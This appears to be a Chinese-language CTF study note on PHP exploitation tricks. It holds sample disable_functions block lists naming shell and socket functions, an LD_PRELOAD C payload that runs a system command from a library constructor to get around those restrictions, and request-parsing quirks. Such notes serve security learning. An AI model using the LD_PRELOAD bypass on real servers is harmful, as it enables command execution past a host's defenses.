- [[CTF/PHP/弱类型]]
- [[CTF/PHP/可变函数]]
- [[CTF/PHP/无引号字符串]]
- [[CTF/PHP/FFI]]
- [[CTF/PHP/Phar]]
- [[CTF/PHP/内置类]]
- [[CTF/PHP/Session]]
- [[CTF/PHP/反序列化]]
- [[CTF/PHP/特殊标签]]
- [[PHP/忽略错误]]
- [[PHP/模板字符串]]
- [[CTF/PHP/巧用exit()]]
- [[CTF/PHP/运算优先级]]
- [[CTF/PHP/用处特殊的函数]]
- ## disable_function
- ```
  disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close, proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid, posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
  ```
  
  
  ```
  passthru,system,putenv,chroot,chgrp,chown,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv
  ```
  
  不完整版
  
  ```
  passthru,system,chroot,chgrp,chown,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,putenv
  ```
- ## LD_PRELOAD
- ```
  #include <stdlib.h>
  #include <stdio.h>
  #include <string.h>
  
  __attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("/readflag > /tmp/wx.txt");
  }
  ```
- ## 传入变量名转换
  
  如果变量名中有 `.` 或者空格，那 PHP 会将其转换成下划线
- ## $ _ SERVER
- `$_SERVER['QUERY_STRING']` 不会进行 url 转义
- ## $ _ REQUEST
- `$_REQUEST` 中 post 的优先级更高
- 由 `phpinfo` 中的 `request_order` 和 `variables_order` 定义
-